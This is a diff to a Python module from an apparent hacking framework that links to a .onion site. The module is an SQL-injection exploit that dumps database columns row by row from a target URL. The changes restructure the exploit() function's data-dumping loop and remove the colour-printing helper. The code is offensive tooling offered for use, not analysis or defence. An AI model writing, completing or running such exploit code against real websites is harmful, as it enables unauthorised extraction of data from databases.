@@ -6,10 +6,9 @@
 # Module written for implementation in WHFramework (http://ljdbosgro7jj4z7r.onion)
 
 import requests
-from itertools import izip_longest as izipl
 
 options = {
-	"target" : "www.example.com/index.php?id=1",
+	"target" : "http://www.example.com/index.php?id=1",
 	"cookies" : "",
 	"row_condition" : "1",
 	"follow_redirections" : 0,
@@ -20,14 +19,6 @@ options = {
 }
 
 dump = []
-
-def colored(text, color):
-	if (color == "red"):
-		return "\033[91m" + text + "\033[0m"
-	elif (color == "green"):
-		return "\033[92m" + text + "\033[0m"
-	elif (color == "blue"):
-		return "\033[94m" + text + "\033[0m"
 
 def fix_host(host):
     if ((not host.startswith("http://")) and (not host.startswith("https://"))):
@@ -73,9 +64,12 @@ def getChar(target):
 def exploit():
     options["target"] = fix_host(options["target"])
     columns = options['columns'].split(',')
+    row_cells = []
     for column in columns:
-        dump.append(column)
+        row_cells.append(column)
+    dump.append(row_cells)
     if options["row_condition"] != '1':
+        row_cells = []
         for column in columns:
             count = 1
             s = ''
@@ -88,10 +82,12 @@ def exploit():
                 else:
                     s += str(char)
                     count += 1
-            dump.append(s)
+            row_cells.append(s)
+        dump.append(row_cells)
     else:
         no_of_rows = getNumberOfRows()
         for x in range(no_of_rows):
+            row_cells = []
             for column in columns:
                 count = 1
                 s = ''
@@ -105,9 +101,6 @@ def exploit():
                     else:
                         count += 1
                         s += str(char)
-                dump.append(s)
-    print colored('[+] Data successfully dumped!', 'green')
-    print colored('[+] Data:', 'green')
-    for cell in izipl(fillvalue='', *[iter(dump)]*(len(columns))):
-        print '\t'.join(cell)
-    return dump #return unformatted dump anyway so that exploit authors can optionally format themselves
+                row_cells.append(s)
+            dump.append(row_cells)
+    return dump
